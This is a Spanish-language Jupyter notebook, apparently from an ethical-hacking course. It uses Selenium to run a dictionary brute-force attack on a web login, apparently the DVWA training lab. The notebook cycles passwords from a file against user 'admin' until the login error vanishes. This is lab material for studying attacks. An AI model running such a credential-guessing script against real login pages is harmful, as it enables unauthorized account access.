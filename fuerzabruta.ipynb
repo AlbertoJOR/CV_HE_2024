{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Fuerza Bruta con diccionario en Python Selenium"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from selenium import webdriver\n",
    "from selenium.webdriver.common.by import By\n",
    "from selenium.webdriver.support.ui import WebDriverWait\n",
    "from selenium.webdriver.support import expected_conditions as EC\n",
    "from selenium.common.exceptions import TimeoutException\n",
    "from selenium.webdriver.common.keys import Keys\n",
    "import time"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "URL a probar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "url_page = \"\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Elegir entre Firefox o Chromium"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# driver = webdriver.Chrome()\n",
    "driver = webdriver.Firefox()\n",
    "driver.get(url_page)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "En el login principal, entrar con:\n",
    "- user: admin \n",
    "- password: password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Realizar un click con Selenium\n",
    "- Buscar el elemento que hace referencia al botón"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "brute_button_name = \"\"\n",
    "timeout=2"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "try:\n",
    "    brute_force_button= WebDriverWait(driver, timeout).until(\n",
    "        EC.element_to_be_clickable((By.LINK_TEXT, brute_button_name)))\n",
    "except TimeoutException:\n",
    "    print(\"No se encontró Brute Force\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "brute_force_button.click()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Nueva ruta al dar click"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "current_url = driver.current_url\n",
    "print(f\"El path del WebDriver es: {current_url}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Fuerza bruta con diccionario"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Buscar los elementos:\n",
    "- Campo nombre de usuario (Username)\n",
    "- Campo contraseña (Password)\n",
    "- Botón de Login"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "username_name = \"\"\n",
    "password_name = \"\"\n",
    "login_name = \"\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Nombre del usuario a probar **admin**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "username = \"admin\"\n",
    "timeout = 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Se realiza un ciclo con todos las contraseña del archivo seleccionado, termina hasta acabar la lista de contraseñas o hasta encontrar la contraseña correcta"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "file_name = \"pass.txt\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open(file_name, 'r') as file:\n",
    "    line = file.readline()\n",
    "    while line:\n",
    "        password = line.strip()\n",
    "        line = file.readline()\n",
    "        print(\"Contraseña intento: \" + password)\n",
    "\n",
    "        try:\n",
    "            username_box = WebDriverWait(driver, timeout).until(\n",
    "                EC.presence_of_element_located((By.NAME, username_name)))\n",
    "            username_box.clear()\n",
    "            username_box.send_keys(username)\n",
    "        except TimeoutException:\n",
    "            print(\"No se encontró el campo de usename\")\n",
    "\n",
    "\n",
    "        try: \n",
    "            password_box = WebDriverWait(driver, timeout).until(\n",
    "                EC.presence_of_element_located((By.NAME, password_name)))\n",
    "            password_box.clear()\n",
    "            password_box.send_keys(password)\n",
    "        except TimeoutException:\n",
    "            print(\"No se encotró el campo de password\")\n",
    "\n",
    "\n",
    "        try: \n",
    "            login_button = WebDriverWait(driver, timeout).until(\n",
    "                EC.element_to_be_clickable((By.NAME, login_name)))\n",
    "            login_button.click()\n",
    "        except TimeoutException:\n",
    "            print(\"No se encontró el botón de Login\")\n",
    "\n",
    "\n",
    "        time.sleep(2)\n",
    "\n",
    "\n",
    "        try:\n",
    "            error_message = WebDriverWait(driver,timeout).until(\n",
    "                EC.presence_of_element_located((By.XPATH, \"//*[@id=\\\"main_body\\\"]/div/div/pre[contains(text(), 'Username and/or password incorrect.')]\")))\n",
    "        except TimeoutException:\n",
    "            print(\"Contraseña encontrada\")\n",
    "            driver.quit()\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Usuario y contraseña encontrados"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"Usuario: \", username)\n",
    "print(\"Contraseña: \", password)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
